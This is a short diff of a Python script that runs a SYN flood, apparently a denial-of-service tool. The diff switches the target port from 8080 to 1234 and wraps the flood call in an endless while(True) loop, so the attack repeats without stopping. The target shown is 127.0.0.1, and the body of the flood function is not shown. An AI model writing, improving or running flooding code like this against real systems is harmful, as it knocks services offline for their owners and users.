@@ -9,7 +9,8 @@ def syn_flood(target_ip, target_port):
 
 if __name__ == "__main__":
     target_ip = "127.0.0.1"
-    target_port = 8080
+    target_port = 1234
 
     print(f"Initiating SYN flooding attack on {target_ip}:{target_port}...")
-    syn_flood(target_ip, target_port)
+    while(True):
+        syn_flood(target_ip, target_port)
